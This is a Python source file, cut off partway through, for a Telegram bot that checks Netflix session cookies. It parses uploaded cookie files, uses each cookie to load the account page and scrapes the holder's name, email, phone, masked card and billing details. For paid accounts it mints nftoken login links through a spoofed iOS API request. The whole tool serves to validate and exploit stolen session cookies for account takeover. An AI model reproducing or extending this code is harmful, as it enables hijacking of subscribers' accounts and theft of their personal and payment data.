import copy
import html
import json
import os
import re
import sys
import time
import zipfile
import asyncio
from datetime import datetime, timedelta
from io import BytesIO

import requests
from urllib3.exceptions import InsecureRequestWarning

# Telegram imports
try:
    from telegram import Update, BotCommand
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
    from telegram.request import HTTPXRequest
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("Install: pip install python-telegram-bot==20.7")
    sys.exit(1)

try:
    import yaml
except ImportError:
    yaml = None

# ==================== READ BOT TOKEN ====================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN environment variable not set!")
    sys.exit(1)

# ==================== CONFIGURATION ====================
DEFAULT_CONFIG = {
    "txt_fields": {
        "name": True, "email": True, "max_streams": True, "plan_price": True,
        "plan": True, "country": True, "member_since": True, "next_billing": True,
        "extra_members": True, "payment_method": True, "card": True, "phone": True,
        "quality": True, "hold_status": True, "email_verified": True,
        "membership_status": True, "profiles": True, "user_guid": False,
    },
    "nftoken": "both",
    "add_emojis": "webhook",
    "notifications": {
        "webhook": {"enabled": False, "url": "", "mode": "full", "plans": "all"},
        "telegram": {"enabled": False, "bot_token": "", "chat_id": "", "mode": "full", "plans": "all"},
    },
    "display": {"mode": "simple"},
    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
    "performance": {
        "request_timeout_seconds": 15,
        "fallback_account_page": False,
        "retry_incomplete_info": False,
        "nftoken_for_free": False,
    },
}

DEFAULT_YAML_CONFIG = """# Netflix Checker Configuration
txt_fields:
  name: true
  email: true
  plan: true
  country: true
  member_since: true
  quality: true
  max_streams: true
  plan_price: true
  next_billing: true
  payment_method: true
  card: true
  phone: true
  hold_status: true
  extra_members: true
  email_verified: true
  membership_status: true
  profiles: true
  user_guid: false

nftoken: "both"
add_emojis: "webhook"

notifications:
  webhook:
    enabled: false
    url: ""
    mode: "full"
    plans: "all"
  telegram:
    enabled: false
    bot_token: ""
    chat_id: ""
    mode: "full"
    plans: "all"

display:
  mode: "simple"

retries:
  error_proxy_attempts: 3
  nftoken_attempts: 1

performance:
  request_timeout_seconds: 15
  fallback_account_page: false
  retry_incomplete_info: false
  nftoken_for_free: false
"""

APP_VERSION = "4.5.0"

# Folders
cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"

# Bot stats
stats = {"total": 0, "valid": 0, "free": 0, "failed": 0, "processing": 0}
user_tasks = {}

# NFToken API settings
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# ==================== HELPER FUNCTIONS ====================

def create_base_folders():
    for folder in [cookies_folder, output_folder, failed_folder, broken_folder]:
        os.makedirs(folder, exist_ok=True)

def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            return copy.deepcopy(DEFAULT_CONFIG)
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config)
        except Exception:
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_YAML_CONFIG)
            return copy.deepcopy(DEFAULT_CONFIG)
    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG)

def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged

def clean_text(text):
    if not text:
        return None
    text = html.unescape(text)
    text = text.replace('\\x20', ' ').replace('\\x40', '@')
    text = text.replace('\\u00A0', ' ').replace('&nbsp;', ' ')
    text = text.replace('\\x2F', '/').replace('\\"', '"')
    text = re.sub(r'\\x[0-9a-fA-F]{2}', '', text)
    try:
        text = text.encode('utf-8').decode('unicode-escape')
    except:
        pass
    return text.strip()

def decode_netflix_value(value):
    if value is None:
        return None
    return clean_text(str(value))

def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None

def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    return cleaned.lower() in {"true", "yes", "1", "on"}

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None

def normalize_phone_number(phone, country_code=None):
    if not phone:
        return None
    cleaned = re.sub(r'\D', '', str(phone))
    if not cleaned:
        return phone
    if len(cleaned) >= 10:
        return f"+{cleaned}"
    return cleaned

def get_full_country_name(country_code):
    countries = {
        "ZA": "South Africa", "EG": "Egypt", "SA": "Saudi Arabia",
        "AE": "United Arab Emirates", "US": "United States", "GB": "United Kingdom",
        "IN": "India", "PK": "Pakistan", "RO": "Romania", "ID": "Indonesia",
        "MY": "Malaysia", "SG": "Singapore", "PH": "Philippines", "TH": "Thailand",
        "VN": "Vietnam", "BR": "Brazil", "MX": "Mexico", "CA": "Canada",
        "AU": "Australia", "DE": "Germany", "FR": "France", "ES": "Spain",
        "IT": "Italy", "TR": "Turkey", "NL": "Netherlands", "SE": "Sweden",
        "NO": "Norway", "DK": "Denmark", "FI": "Finland", "PL": "Poland",
        "GR": "Greece", "PT": "Portugal", "IE": "Ireland", "BE": "Belgium",
        "CH": "Switzerland", "AT": "Austria", "CZ": "Czech Republic", "HU": "Hungary",
        "IL": "Israel", "JP": "Japan", "KR": "South Korea", "CN": "China",
        "TW": "Taiwan", "HK": "Hong Kong",
    }
    return countries.get(country_code.upper(), country_code)

def clean_profile_names(profiles_raw):
    if not profiles_raw:
        return [], 0
    
    forbidden_names = [
        'android', 'tablet', 'apple', 'windows', 'mac', 'linux',
        'chrome', 'firefox', 'safari', 'edge', 'opera', 'brave',
        'ios', 'ipad', 'iphone', 'smart tv', 'tv', 'netflix',
        'profile', 'user', 'default', 'unknown', 'device',
        'mobile', 'phone', 'computer', 'pc', 'laptop', 'desktop',
        'api', 'akira', 'buildidentifier', 'identifier', 'null',
        'undefined', 'none', 'nil', 'false', 'true', 'build',
        'premium', 'standard', 'basic', 'free'
    ]
    
    names_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
    clean_names = []
    for name in names_list:
        name = clean_text(name)
        name_lower = name.lower()
        if name_lower in forbidden_names or len(name) < 2:
            continue
        skip = False
        for forbidden in forbidden_names:
            if forbidden in name_lower:
                skip = True
                break
        if skip:
            continue
        if re.match(r'^\d+$', name) or re.search(r'[{}[]<>]', name):
            continue
        clean_names.append(name)
    
    if not clean_names and names_list:
        clean_names = [clean_text(names_list[0])]
    return clean_names, len(clean_names)

def get_membership_status_display(status):
    status_map = {
        "current_member": "Active", "former_member": "Cancelled / Expired",
        "active": "Active", "current": "Active", "past_due": "Past Due",
        "cancelled": "Cancelled"
    }
    normalized = normalize_plan_key(status) if status else "unknown"
    return status_map.get(normalized, status or "Unknown")

def extract_payment_method_strong(html_content, info):
    payment = info.get("paymentMethodType")
    if payment and payment not in ["Unknown", "N/A", "null"]:
        if payment.upper() == "CC":
            return "Credit Card"
        if payment.upper() == "PAYPAL":
            return "PayPal"
        return payment
    return "Credit Card"


# ==================== COOKIE EXTRACTION FUNCTIONS ====================

def is_netflix_domain(domain):
    domain = str(domain or "").replace("#HttpOnly_", "").lower()
    return "netflix." in domain

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)

def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    return bool(cookie_dict.get("NetflixId"))

def extract_netflix_cookie_bundles(content):
    def extract_json_entries(content):
        try:
            data = json.loads(content)
        except:
            return []
        if isinstance(data, dict):
            if "cookies" in data:
                data = data["cookies"]
            elif "items" in data:
                data = data["items"]
            else:
                data = [data]
        if not isinstance(data, list):
            return []
        entries = []
        for idx, cookie in enumerate(data):
            if not isinstance(cookie, dict):
                continue
            domain = cookie.get("domain", "")
            name = cookie.get("name", "")
            if name not in ALL_NETFLIX_COOKIE_NAMES and not is_netflix_domain(domain):
                continue
            tail = "TRUE" if domain.startswith(".") else "FALSE"
            path = cookie.get("path", "/")
            secure = "TRUE" if cookie.get("secure", False) else "FALSE"
            expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
            value = cookie.get("value", "")
            entries.append({
                "domain": domain, "tail_match": tail, "path": path,
                "secure": secure, "expires": expires, "name": name,
                "value": value, "position": idx
            })
        return entries
    
    def extract_netscape_entries(raw_text):
        entries = []
        for idx, line in enumerate(raw_text.splitlines()):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if line.startswith("#HttpOnly_"):
                line = line[10:]
            parts = line.split("\t")
            if len(parts) < 7:
                parts = re.split(r"\s+", line, 6)
            if len(parts) < 7:
                continue
            domain, tail, path, secure, expires, name, value = parts[:7]
            if name not in ALL_NETFLIX_COOKIE_NAMES and not is_netflix_domain(domain):
                continue
            entries.append({
                "domain": domain, "tail_match": tail, "path": path,
                "secure": secure, "expires": expires, "name": name,
                "value": value, "position": idx
            })
        return entries
    
    def build_bundles(entries):
        if not entries:
            return []
        by_name = {}
        for e in entries:
            by_name.setdefault(e["name"], []).append(e)
        bundle_count = max(len(v) for v in by_name.values())
        bundles = []
        for i in range(bundle_count):
            selected = []
            for name, lst in by_name.items():
                if i < len(lst):
                    selected.append(lst[i])
                elif len(lst) == 1:
                    selected.append(lst[0])
            selected.sort(key=lambda x: x.get("position", 0))
            cookies = {e["name"]: e["value"] for e in selected}
            bundles.append({"cookies": cookies})
        return bundles
    
    for extractor in (extract_json_entries, extract_netscape_entries):
        bundles = build_bundles(extractor(content))
        if bundles:
            return bundles
    return []


# ==================== ACCOUNT INFO EXTRACTION ====================

def extract_graphql_data(html_content):
    script_pattern = r'<script[^>]*>window\.__NUXT__\s*=\s*({.*?})</script>'
    match = re.search(script_pattern, html_content, re.DOTALL)
    if match:
        try:
            data = json.loads(match.group(1))
            if 'state' in data:
                for key, value in data['state'].items():
                    if 'growthAccount' in str(key):
                        if isinstance(value, dict):
                            ga = value.get('data', {}).get('growthAccount', {})
                            if ga:
                                return extract_account_info(ga)
        except:
            pass
    return {}

def extract_account_info(growth_account):
    info = {}
    info['accountOwnerName'] = decode_netflix_value(growth_account.get('ownerName')) or decode_netflix_value(growth_account.get('accountOwnerName'))
    info['email'] = decode_netflix_value(growth_account.get('email'))
    info['countryOfSignup'] = decode_netflix_value(growth_account.get('countryOfSignUp', {}).get('code'))
    info['memberSince'] = decode_netflix_value(growth_account.get('memberSince'))
    info['membershipStatus'] = decode_netflix_value(growth_account.get('membershipStatus'))
    info['userGuid'] = decode_netflix_value(growth_account.get('ownerGuid'))
    info['isUserOnHold'] = growth_account.get('isUserOnHold', False)
    
    current_plan = growth_account.get('currentPlan', {}).get('plan', {})
    info['localizedPlanName'] = decode_netflix_value(current_plan.get('name'))
    info['planPrice'] = decode_netflix_value(current_plan.get('priceDisplay'))
    info['videoQuality'] = decode_netflix_value(current_plan.get('videoQuality'))
    info['maxStreams'] = current_plan.get('maxStreams')
    
    next_billing = growth_account.get('nextBillingDate', {})
    info['nextBillingDate'] = decode_netflix_value(next_billing.get('localDate') or next_billing.get('date'))
    
    payment_methods = growth_account.get('growthPaymentMethods', [])
    if payment_methods:
        pm = payment_methods[0]
        info['paymentMethodType'] = decode_netflix_value(pm.get('paymentOptionLogo'))
        info['maskedCard'] = decode_netflix_value(pm.get('displayText'))
    
    phone = growth_account.get('growthLocalizablePhoneNumber', {})
    phone_raw = decode_netflix_value(phone.get('rawPhoneNumber'))
    info['phoneNumber'] = normalize_phone_number(phone_raw)
    info['phoneVerified'] = phone.get('isVerified', False)
    
    email_obj = growth_account.get('growthEmail', {})
    if email_obj:
        email_value = decode_netflix_value(email_obj.get('email', {}).get('value'))
        if email_value:
            info['email'] = email_value
        info['emailVerified'] = email_obj.get('isVerified', False)
    
    profiles = growth_account.get('profiles', [])
    profile_names = [decode_netflix_value(p.get('name')) for p in profiles if p.get('name')]
    info['profiles'] = ", ".join(profile_names) if profile_names else None
    info['profileCount'] = len(profile_names)
    
    return {k: v for k, v in info.items() if v}

def get_name_from_profiles(info):
    profiles_raw = info.get("profiles") or ""
    if profiles_raw:
        clean_names, _ = clean_profile_names(profiles_raw)
        if clean_names:
            return clean_names[0]
    return "Unknown"

def extract_info_fallback(response_text):
    extracted = {
        "accountOwnerName": extract_first_match(response_text, [r'"ownerName":"([^"]+)"', r'"name":"([^"]+)"']),
        "email": extract_first_match(response_text, [r'"email":"([^"]+)"', r'"loginId":"([^"]+)"']),
        "countryOfSignup": extract_first_match(response_text, [r'"currentCountry":"([^"]+)"', r'"countryOfSignup":"([^"]+)"']),
        "memberSince": extract_first_match(response_text, [r'"memberSince":"([^"]+)"', r'"joinDate":"([^"]+)"']),
        "nextBillingDate": extract_first_match(response_text, [r'"nextBillingDate":"([^"]+)"', r'"billingDate":"([^"]+)"']),
        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":"([^"]+)"', r'"status":"([^"]+)"']),
        "maxStreams": extract_first_match(response_text, [r'"maxStreams":(\d+)', r'"streams":(\d+)']),
        "localizedPlanName": extract_first_match(response_text, [r'"localizedPlanName":"([^"]+)"', r'"planName":"([^"]+)"']),
        "planPrice": extract_first_match(response_text, [r'"planPrice":"([^"]+)"', r'"price":"([^"]+)"']),
        "videoQuality": extract_first_match(response_text, [r'"videoQuality":"([^"]+)"', r'"quality":"([^"]+)"']),
        "paymentMethodType": extract_first_match(response_text, [r'"paymentMethodType":"([^"]+)"']),
        "maskedCard": extract_first_match(response_text, [r'"maskedCard":"([^"]+)"', r'"cardNumber":"([^"]+)"']),
    }
    return {k: v for k, v in extracted.items() if v}

def extract_info(response_text):
    all_info = extract_graphql_data(response_text)
    if not any(all_info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"]):
        fallback = extract_info_fallback(response_text)
        if fallback:
            all_info.update(fallback)
    return all_info

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    return re.sub(r"[^\w]+", "_", plan_name.lower()).strip("_")

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    if not is_subscribed and not raw_plan:
        return "free", "Free"
    norm = normalize_plan_key(raw_plan) if raw_plan else ""
    if norm in ("premium", "premium_plan"):
        return "premium", "Premium"
    if norm in ("standard", "estandar"):
        return "standard", "Standard"
    if norm in ("basic", "basico"):
        return "basic", "Basic"
    streams = info.get("maxStreams")
    if streams:
        try:
            streams = int(str(streams))
            if streams >= 4:
                return "premium", "Premium"
            if streams >= 2:
                return "standard", "Standard"
        except:
            pass
    return "unknown", "Unknown"

def is_subscribed_account(info):
    status = normalize_plan_key(info.get("membershipStatus"))
    return status in ["current_member", "active", "current"]

def is_extra_member_account(info):
    plan = str(info.get("localizedPlanName", "")).lower()
    return "extra" in plan

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %d, %Y")
    except:
        pass
    return cleaned

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %Y")
    except:
        pass
    return cleaned

def country_code_to_flag(country_code):
    raw = decode_netflix_value(country_code) or ""
    if len(raw) == 2 and raw.isalpha():
        return "".join(chr(127397 + ord(c)) for c in raw.upper())
    return ""

def format_country_with_flag(country_value):
    country_code = decode_netflix_value(country_value) or "Unknown"
    country_name = get_full_country_name(country_code)
    flag = country_code_to_flag(country_code)
    return f"{country_name} {flag}".strip()

def get_language_from_html(html_content):
    loc_match = re.search(r'data-uia="loc"\s+lang="([^"]+)"', html_content)
    if loc_match:
        lang = loc_match.group(1)
        lang_names = {"en": "English", "ar": "العربية", "es": "Español", "fr": "Français", "de": "Deutsch"}
        base_lang = lang.split('-')[0]
        return lang_names.get(lang, lang_names.get(base_lang, lang))
    return "English"

def create_nftoken(cookie_dict, attempts=1):
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        resp = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=30, verify=False)
        if resp.status_code != 200:
            return None, f"HTTP {resp.status_code}"
        data = resp.json()
        token_data = data.get("value", {}).get("account", {}).get("token", {}).get("default", {})
        token = token_data.get("token")
        if token:
            expiry = (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
            return {"token": token, "expires_at_utc": expiry}, None
    except:
        pass
    return None, "Failed"

def build_nftoken_links(token, mode):
    if not token:
        return []
    return [("PC Login", f"https://netflix.com/?nftoken={token}")]

def get_account_page(session, timeout=20):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    }
    urls = ["https://www.netflix.com/account/", "https://www.netflix.com/account/membership"]
    
    for url in urls:
        try:
            resp = session.get(url, headers=headers, timeout=timeout)
            if resp.status_code == 200:
                info = extract_info(resp.text)
                if any(info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"]):
                    return resp.text, resp.status_code, info
        except:
            continue
    return "", 0, {}


# ==================== RESULT FORMATTING ====================

def format_result_beautiful(info, is_subscribed, cookie_filename, nftoken_data=None, html_content=""):
    plan_key, plan_label = derive_plan_info(info, is_subscribed)
    status = "Valid Premium Account" if is_subscribed else "Valid Free Account"
    
    account_name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
    if account_name == "Unknown" or account_name.lower() in ['chrome', 'firefox']:
        account_name = get_name_from_profiles(info)
    
    email = decode_netflix_value(info.get("email")) or "Unknown"
    email = clean_text(email)
    country = format_country_with_flag(info.get("countryOfSignup"))
    language = get_language_from_html(html_content)
    plan = plan_label
    price = decode_netflix_value(info.get("planPrice")) or "N/A"
    member_since = format_member_since(info.get("memberSince")) or "Unknown"
    next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
    payment = extract_payment_method_strong("", info)
    card = decode_netflix_value(info.get("maskedCard")) or "N/A"
    phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
    phone_verified = "Verified" if format_boolean_label(info.get("phoneVerified")) == "Yes" else "Not Verified"
    quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
    streams = str(info.get("maxStreams") or "Unknown").rstrip("}")
    hold = "No" if format_boolean_label(info.get("isUserOnHold")) != "Yes" else "Yes"
    extra_member = "Yes" if is_extra_member_account(info) else "No"
    email_verified = "Yes" if format_boolean_label(info.get("emailVerified")) == "Yes" else "No"
    membership_status = get_membership_status_display(info.get("membershipStatus"))
    
    profiles_raw = info.get("profiles") or ""
    clean_profiles, profiles_count = clean_profile_names(profiles_raw)
    profiles_display = ", ".join(clean_profiles[:10]) if clean_profiles else "None"
    
    lines = []
    lines.append(f"STATUS: {status}")
    lines.append("")
    lines.append("ACCOUNT DETAILS")
    lines.append("-" * 40)
    lines.append(f"Name: {account_name}")
    lines.append(f"Email: {email}")
    lines.append(f"Country: {country}")
    lines.append(f"Language: {language}")
    lines.append(f"Plan: {plan}")
    
    if is_subscribed:
        if price != "N/A":
            lines.append(f"Price: {price}")
        if member_since != "Unknown":
            lines.append(f"Member Since: {member_since}")
        if next_billing != "Unknown":
            lines.append(f"Next Billing: {next_billing}")
        lines.append(f"Payment: {payment}")
        if card and card != "N/A":
            lines.append(f"Card: {card}")
        if phone and phone != "N/A":
            lines.append(f"Phone: {phone} ({phone_verified})")
        if quality != "Unknown":
            lines.append(f"Quality: {quality}")
        if streams != "Unknown":
            lines.append(f"Streams: {streams}")
        lines.append(f"Hold Status: {hold}")
        lines.append(f"Extra Member: {extra_member}")
        lines.append(f"Email Verified: {email_verified}")
        lines.append(f"Membership Status: {membership_status}")
    
    lines.append("")
    lines.append("PROFILES")
    lines.append("-" * 40)
    lines.append(f"Connected Profiles: {profiles_count}")
    lines.append(f"Profiles: {profiles_display}")
    
    if is_subscribed and nftoken_data and nftoken_data.get("token"):
        lines.append("")
        lines.append("NFTOKEN LOGIN LINKS")
        lines.append("-" * 40)
        for label, link in build_nftoken_links(nftoken_data["token"], "both"):
            lines.append(f"{label}: {link}")
        if nftoken_data.get("expires_at_utc"):
            lines.append(f"Valid Until: {nftoken_data['expires_at_utc']}")
    
    lines.append("")
    lines.append("=" * 65)
    lines.append("")
    
    return "\n".join(lines), plan_key


# ==================== PROGRESS BAR ====================

def format_progress_message(processed, total, valid_count, premium_count, free_count, invalid_count, speed, eta):
    percentage = (processed / total) * 100 if total > 0 else 0
    filled = int(15 * percentage / 100)
    empty = 15 - filled
    bar = "█" * filled + "░" * empty
    
    return f"""📊 Processing Progress: {percentage:.1f}% {bar}

📁 {processed}/{total} cookies
✅ Valid: {valid_count} (💰 Premium: {premium_count} | 🆓 Free: {free_count})
❌ Invalid: {invalid_count}
⚡ Speed: {speed:.1f} acc/s
⏱️ ETA: {eta:.1f}s

/cancel to stop"""


# ==================== BOT HANDLERS ====================

async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    first_name = user.first_name if user.first_name else "User"
    await update.message.reply_text(f"""
🎬 Netflix Cookie Checker Bot

✨ Welcome {first_name}!

⚙️ HOW TO USE:
   1️⃣ Export cookies (.txt or .json)
   2️⃣ Send files directly
   3️⃣ Receive results in ONE file

🕹️ COMMANDS:
   /start - Show menu
   /help - Instructions
   /stats - Statistics
   /cancel - Stop task
""")

async def bot_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
📖 HELP

Send .txt or .json files with Netflix cookies.
Bot will check them and return results in ONE file.

Commands:
/start - Main menu
/stats - Bot statistics
/cancel - Stop current task
""")

async def bot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"""
📊 STATISTICS

Total checked: {stats['total']}
✅ Valid Premium: {stats['valid']}
🆓 Free accounts: {stats['free']}
❌ Failed: {stats['failed']}
🔄 Processing: {stats['processing']}
""")

async def bot_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in user_tasks and user_tasks[uid].get('active'):
        user_tasks[uid]['cancel'] = True
        await update.message.reply_text("⏹️ Cancelling task...")
    else:
        await update.message.reply_text("ℹ️ No active task")


# ==================== PROCESS BUNDLE ====================

async def process_single_bundle(bundle, cookie_filename, idx, total, mode):
    cookies = bundle.get("cookies", {})
    if not has_required_netflix_cookies(cookies):
        return None, None, "missing"
    
    session = requests.Session()
    session.cookies.update(cookies)
    response_text, status_code, info = get_account_page(session, timeout=20)
    
    if status_code == 200 and info:
        is_sub = is_subscribed_account(info)
        nftoken = None
        if is_sub:
            nftoken, _ = create_nftoken(cookies, 1)
        
        result, plan_key = format_result_beautiful(info, is_sub, cookie_filename, nftoken, response_text)
        return result, plan_key, "success" if is_sub else "free"
    else:
        return None, None, "invalid"


# ==================== SINGLE FILE HANDLER (ملف واحد زي ما انت عايز) ====================

async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    
    uid = update.effective_user.id
    user_tasks[uid] = {'active': True, 'cancel': False}
    doc = update.message.document
    fname = doc.file_name
    start_time = time.time()
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 10MB")
        user_tasks[uid]['active'] = False
        return
    
    file = await doc.get_file()
    data = BytesIO()
    await file.download_to_memory(data)
    content = data.getvalue().decode('utf-8', errors='ignore')
    
    bundles = extract_netflix_cookie_bundles(content)
    
    if not bundles:
        await update.message.reply_text("❌ No valid Netflix cookies found")
        stats['failed'] += 1
        user_tasks[uid]['active'] = False
        return
    
    total_bundles = len(bundles)
    await update.message.reply_text(f"📦 Found {total_bundles} cookie(s). Starting check...")
    
    # كل النتايج في ملف واحد
    all_premium_results = []
    all_free_results = []
    all_partial_results = []
    invalid_count = 0
    processed = 0
    premium_count = 0
    free_count = 0
    
    status_msg = await update.message.reply_text(format_progress_message(0, total_bundles, 0, 0, 0, 0, 0, 0))
    mode = context.user_data.get('mode', 'fullinfo')
    
    for idx, bundle in enumerate(bundles, 1):
        if user_tasks[uid].get('cancel', False):
            await status_msg.edit_text("⏹️ Cancelled by user")
            break
        
        result, plan_key, result_type = await process_single_bundle(bundle, fname, idx, total_bundles, mode)
        
        if result:
            if result_type == "success":
                all_premium_results.append(result)
                premium_count += 1
                stats['valid'] += 1
            elif result_type == "free":
                all_free_results.append(result)
                free_count += 1
                stats['free'] += 1
        else:
            invalid_count += 1
            stats['failed'] += 1
        
        stats['total'] += 1
        processed += 1
        
        # تحديث شريط التقدم
        if processed % 3 == 0 or processed == total_bundles:
            elapsed = time.time() - start_time
            speed = processed / elapsed if elapsed > 0 else 0
            remaining = total_bundles - processed
            eta = remaining / speed if speed > 0 else 0
            await status_msg.edit_text(format_progress_message(processed, total_bundles, stats['valid'], premium_count, free_count, invalid_count, speed, eta))
    
    if not user_tasks[uid].get('cancel', False):
        elapsed = time.time() - start_time
        spd = total_bundles / elapsed if elapsed > 0 else 0
        
        final_stats = f"""
✅ Processing Complete

Total Cookies: {total_bundles}
Premium Accounts: {premium_count}
Free Accounts: {free_count}
Invalid Accounts: {invalid_count}
Time: {elapsed:.2f}s | Speed: {spd:.2f} acc/s
"""
        await status_msg.delete()
        await update.message.reply_text(final_stats)
        
        # إرسال ملف PREMIUM واحد (كل premium accounts في ملف واحد)
        if all_premium_results:
            combined_premium = "".join(all_premium_results)
